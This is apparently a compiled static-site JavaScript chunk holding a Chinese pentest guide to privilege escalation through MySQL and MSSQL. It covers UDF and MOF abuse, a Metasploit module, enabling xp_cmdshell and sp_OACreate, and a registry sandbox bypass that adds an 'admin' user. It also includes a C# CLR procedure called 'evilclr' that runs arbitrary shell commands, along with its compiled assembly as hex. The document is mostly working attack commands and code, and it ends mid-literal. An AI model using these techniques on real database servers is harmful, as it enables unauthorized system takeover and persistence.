import{_ as l}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as t,c as p,a as s,b as n,d as i,e as a,r as c}from"./app.ed2888ea.js";const d="/assets/image-20221125222057348.d9e079c4.png",o="/assets/image-20221125222331176.4f4969d9.png",r="/assets/image-20221125222531816.80cd3996.png",u="/assets/image-20221125222749920.950a0e08.png",m="/assets/image-20221125222839112.0756c835.png",v="/assets/image-20221125223401534.08f0d792.png",E={},k=a(`<h2 id="mysql数据库" tabindex="-1"><a class="header-anchor" href="#mysql数据库" aria-hidden="true">#</a> MySQL数据库</h2><h3 id="udf提权" tabindex="-1"><a class="header-anchor" href="#udf提权" aria-hidden="true">#</a> UDF提权</h3><details class="custom-container details"><summary>UDF提权原理</summary><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数</p><p>用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll</p><p>利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)</p><p>当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。</p><p>这样我们自定义的函数才被当作本机函数执行。</p><p>在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而提权</p></details><details class="custom-container details"><summary>利用条件</summary><p>1、有mysql的root账号密码</p><p>2、secure_file_priv为空</p><p>当<code>secure_file_priv</code>没有具体值时，表示不对MySQL的导入导出做限制，null表示不允许导入导出</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#查看secure_file_priv的值</span>
SHOW VARIABLES LIKE <span class="token string">&quot;secure_file_priv&quot;</span><span class="token punctuation">;</span>

<span class="token comment">#这个值可以在my.ini设置为空</span>
secure_file_priv <span class="token operator">=</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>`,4),b={class:"custom-container details"},g=a(`<summary>操作步骤</summary><p>1、查询插件安装目录</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>show variables like %plugin%

mysql版本 <span class="token operator">&lt;</span> <span class="token number">5.2</span> , UDF导出到系统目录 c:/windows/system32/
mysql版本 <span class="token operator">&gt;</span> <span class="token number">5.2</span> ，UDF导出到安装路径 MySQL<span class="token punctuation">\\</span>Lib<span class="token punctuation">\\</span>Plugin<span class="token punctuation">\\</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--先找到Mysql的目录</span>
<span class="token keyword">select</span> @<span class="token variable">@basedir</span><span class="token punctuation">;</span>

<span class="token comment">--利用ADS流来创建plugin文件夹（测试并不能成功创建）</span>
<span class="token keyword">select</span> <span class="token string">&#39;It is dll&#39;</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&#39;C:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--有Webshell这样创建plugin文件夹：</span>
echo <span class="token number">123</span> <span class="token operator">&gt;</span> C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过WebShell上传udf.php（这种方法数据库不用外连也可以）</p>`,6),C={href:"https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php",target:"_blank",rel:"noopener noreferrer"},F=a(`<h3 id="mof提权" tabindex="-1"><a class="header-anchor" href="#mof提权" aria-hidden="true">#</a> MOF提权</h3><details class="custom-container details"><summary>MOF提权原理</summary><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）</p><p>叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，而且是系统权限；</p><p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p><p>然后系统每隔五秒就会执行一次我们上传的MOF。</p><p>MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p></details><details class="custom-container details"><summary>利用条件</summary><p>已知数据库root账号密码，数据库允许外连</p><p>mysql在c:/windows/system32/wbem/mof目录有写权限</p><p>secure_file_priv 为空</p><p>条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权</p></details><p><strong>MSF 下有Mof 提权模块</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#执行成功后会直接反弹一个 system权限的meterpreter 。</span>
use exploit/windows/mysql/mysql_mof
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="mssql数据库" tabindex="-1"><a class="header-anchor" href="#mssql数据库" aria-hidden="true">#</a> MSSQL数据库</h2><p>首先查看权限</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--是否sa权限，返回 1 就是sa</span>
<span class="token keyword">select</span> IS_SRVROLEMEMBER<span class="token punctuation">(</span><span class="token string">&#39;sysadmin&#39;</span><span class="token punctuation">)</span>

<span class="token comment">--是否dba权限，返回 1 就是DBA</span>
<span class="token keyword">select</span> IS_MEMBER<span class="token punctuation">(</span><span class="token string">&#39;db_owner&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="一、xp-cmdshell" tabindex="-1"><a class="header-anchor" href="#一、xp-cmdshell" aria-hidden="true">#</a> 一、xp_cmdshell</h3><details class="custom-container details"><summary>利用条件</summary><p>MSSQL以system运行的才能提权，<code>nt authority\\network service</code>，是没有系统权限的。</p></details><p>这个组件默认情况下是关闭的，用下边的命令开启</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;show advanced options&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">--允许修改高级参数</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;xp_cmdshell&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">--打开xp_cmdshell扩展</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12),A={href:"https://fix4dll.com/xplog70_dll",target:"_blank",rel:"noopener noreferrer"},h=a(`<div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">Exec</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sp_addextendedproc <span class="token string">&#39;xp_cmdshell&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL12.MSSQLSERVER\\MSSQL\\Binn\\xplog70.dll&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--然后执行命令</span>

<span class="token keyword">exec</span> xp_cmdshell <span class="token string">&#39;whoami&#39;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="二、sp-oacreate" tabindex="-1"><a class="header-anchor" href="#二、sp-oacreate" aria-hidden="true">#</a> 二、SP_OACreate</h3><p>当xp_cmdshell 删除以后，还可以使用SP_OACreate</p><details class="custom-container details"><summary>原理</summary><p>sp_oacreate存储过程可以删除、复制、移动文件；</p><p>还能配合sp_oamethod 来写文件，通过 wscript.shell 调用cmd执行系统命令</p></details><p><strong>首先要打开组件：</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--开启</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;show advanced options&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;Ole Automation Procedures&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>


<span class="token comment">--关闭</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;show advanced options&#39;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;Ole Automation Procedures&#39;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>之后使用以下语句执行命令：</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span><span class="token punctuation">;</span>
<span class="token keyword">exec</span> sp_oacreate <span class="token string">&#39;wscript.shell&#39;</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output<span class="token punctuation">;</span>
<span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">&#39;run&#39;</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">&#39;c:\\windows\\system32\\cmd.exe /c whoami &gt;c:\\\\1.txt&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>这种方式是无回显的，打开1.txt查看命令执行结果</strong></p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token function">type</span> c:\\\\1<span class="token punctuation">.</span>txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="三、openrowset沙盒" tabindex="-1"><a class="header-anchor" href="#三、openrowset沙盒" aria-hidden="true">#</a> 三、Openrowset沙盒</h3><p>(2003系统可用、2012-r2实验失败)</p><details class="custom-container details"><summary>利用原理</summary><p>沙盒模式是数据库的一种安全功能。</p><p>在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。</p><p>如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p><p>本质是修改注册表 来劫持粘贴键 当然在2008数据库是不成立的 因为默认权限很低</p></details><p>开启默认关闭的xp_regwrite存储过程</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--开启</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_regwrite <span class="token string">&#39;HKEY_LOCAL_MACHINE&#39;</span> <span class="token punctuation">,</span><span class="token string">&#39;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#39;</span> <span class="token punctuation">,</span><span class="token string">&#39;SandBoxMode&#39;</span> <span class="token punctuation">,</span><span class="token string">&#39;REG_DWORD&#39;</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;show advanced options&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;Ad Hoc Distributed Queries&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>

<span class="token comment">--利用完后恢复</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_regwrite <span class="token string">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;SandBoxMode&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;REG_DWORD&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;Ad Hoc Distributed Queries&#39;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">reconfigure</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">&#39;show advanced options&#39;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">reconfigure</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>利用jet.oledb执行系统命令</strong></p><p>这个也是无回显的</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">From</span> <span class="token keyword">OpenRowSet</span><span class="token punctuation">(</span><span class="token string">&#39;Microsoft.Jet.OLEDB.4.0&#39;</span> <span class="token punctuation">,</span><span class="token string">&#39;;Databasec:\\windows\\system32\\ias\\ias.mdb&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;select shell( net user admin pwd123 /add )&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><details class="custom-container details"><summary>沙盒模式SandBoxMode参数含义（默认是2）</summary><p>0：在任何所有者中禁止启用安全模式</p><p>1 ：为仅在允许范围内</p><p>2 ：必须在access模式下</p><p>3：完全开启</p></details><h2 id="clr公共语言运行时" tabindex="-1"><a class="header-anchor" href="#clr公共语言运行时" aria-hidden="true">#</a> CLR公共语言运行时</h2><details class="custom-container details"><summary>利用原理</summary><p>CLR是<code>.NET</code>框架的核心，为<code>.NET</code>程序提供了代码的执行环境。</p><p>SQL CLR 是 SQL Server2005 出现的新功能，它将<code>.NET框架</code>中的 CLR 服务注入到 SQL Server 中</p><p>让 SQL Server 的部分数据库对象可以使用 .NET 框架的编程语言进行开发（VB、<code>C#</code>）。</p></details><h3 id="制作恶意clr" tabindex="-1"><a class="header-anchor" href="#制作恶意clr" aria-hidden="true">#</a> 制作恶意CLR</h3><div class="custom-container tip"><p class="custom-container-title">运行环境说明</p><p>MSSQL &lt;= 2008：.NET3.5</p><p>MSSQL &gt;= 2012：.NET4.0+</p></div><p>使用C#来创建一个clr项目，在项目中我们创建一个存储过程调用cmd来执行命令</p><p>1）创建MSSQL数据库项目</p><p><img src="`+d+'" alt="image-20221125222057348" loading="lazy"></p><p>2）修改项目属性</p><p><img src="'+o+'" alt="image-20221125222331176" loading="lazy"></p><p>选择<code>.NET</code>版本，因为要调用外部程序，必须设置权限级别为UNSAFE</p><p><img src="'+r+'" alt="image-20221125222531816" loading="lazy"></p><p>3）新建CLR存储过程</p><p><img src="'+u+'" alt="image-20221125222749920" loading="lazy"></p><p><img src="'+m+`" alt="image-20221125222839112" loading="lazy"></p><p>4）CLR代码</p><div class="language-c# line-numbers-mode" data-ext="c#"><pre class="language-c#"><code>using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecCommand (string cmd)
    {
        // 在此处放置代码
        SqlContext.Pipe.Send(&quot;Command is running...&quot;);
        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));
    }
    public static string RunCommand(string filename,string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine(&quot;Std output:&quot;);
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);
        }
        return stdOutput.ToString();
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>5）编译程序</p><p>右键项目点击&quot;生成&quot;，生成解决方案进行编译；</p><p>在项目的bin目录会生成导入程序集并且创建执行命令存储过程的sql语句。</p><p><img src="`+v+`" alt="image-20221125223401534" loading="lazy"></p><h3 id="导入程序集" tabindex="-1"><a class="header-anchor" href="#导入程序集" aria-hidden="true">#</a> 导入程序集</h3><p>CLR功能MSSQL中是默认没有开启的，需要手动开启</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>sp_configure <span class="token string">&#39;clr enabled&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span>
GO
<span class="token keyword">RECONFIGURE</span>
GO

<span class="token comment">--将数据库标记为安全</span>
<span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在项目编译完之后生成的sql文件中有字节流形式的语句来导入</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>evilclr<span class="token punctuation">]</span>
    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>
    <span class="token keyword">FROM</span> <span class="token number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030006D280630000000000000000E00022200B013000000E00000006000000000000362C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000E42B00004F00000000400000A002000000000000000000000000000000000000006000000C000000AC2A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E746578740000003C0C000000200000000E000000020000000000000000000000000000200000602E72737263000000A0020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000182C00000000000048000000020005007C220000300800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A722D000070723D00007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C2200110672470000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A22518725F000070A22519076F1C00000A13091209282000000AA2251A7297000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076322E302E35303732370000000005006C000000A8020000237E000014030000AC03000023537472696E677300000000C0060000A0000000235553006007000010000000234755494400000070070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D30101000000000006006D01B40206008D01B40206004301A1020F00D402000006003603DE010A00570154020E000F03A1020600E501DE0106002602740306002801B4020E00F402A1020A00800354020A00200154020600C101DE010E00FD01A1020E00CF00A1020E003B02A10206000E023D0006001B023D0006002700DE01000000002D00000000000100010001001000E3020000150001000100030110000100000015000100040006006A03790050200000000096008A007D000100842000000000960096001A0002005C220000000086189B02060004005C220000000086189B02060004006522000000008300160082000400000001007C0000000100EF00000002002503000001003402000002000A0309009B02010011009B02060019009B020A0031009B02060051009B0206006100170110006900A100150071002F031A0039009B0206003900EF0132007900E200150071009E03370079001703150079008B033C007900BF0041007900AB013C00790081023C0079004F033C0049009B02060089009B024700390065004D003900490353003900F800060039006F025700990080005C0039003D0306004100B3005C003900A60060002900BF015C0049000C0164004900C8016000A100BF015C0071002F036A0029009B020600590053005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000003600000002000000000000000000000070005C000000000002000000000000000000000070004700000000000200000000000000000000007000DE0100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E00434C5253514C0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E67746800434C5253514C2E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D70747900002B43006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002E002E002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A002000000000006DC29D75D404AC4FA59597440474D237000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000000401000000000000000006D2806300000000020000001C010000C82A0000C80C0000525344538C4A2EA38568D24B9C139690DCB8972601000000433A5C55736572735C77696E7472797365635C736F757263655C7265706F735C434C5253514C5C6F626A5C44656275675C434C5253514C2E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C2C00000000000000000000262C0000002000000000000000000000000000000000000000000000182C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000036000B00010049006E007400650072006E0061006C004E0061006D006500000043004C005200530051004C002E0064006C006C00000000002800020001004C006500670061006C0043006F0070007900720069006700680074000000200000003E000B0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043004C005200530051004C002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000383C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>
